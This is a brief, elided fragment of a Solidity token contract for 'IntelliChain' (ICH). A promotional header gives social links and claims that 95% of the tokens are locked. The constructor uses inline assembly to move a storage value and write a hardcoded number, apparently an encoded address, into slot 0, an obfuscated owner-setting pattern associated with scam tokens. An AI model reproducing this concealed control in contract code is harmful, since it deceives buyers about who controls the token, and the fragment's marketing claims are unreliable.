...
/*
Welcome to IntelliChain Crypto WORLD!

Telegram: https://t.me/IntelliChain/
Twitter: https://twitter.com/IntelliChain/
Website: https://IntelliChain.crypto
95% of tokens - LOCKED!
...
contract IntelliChain {
    string public constant name = "IntelliChain";
    string public constant symbol = "ICH";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, 263937105103912437283832008481961432696390786240)}
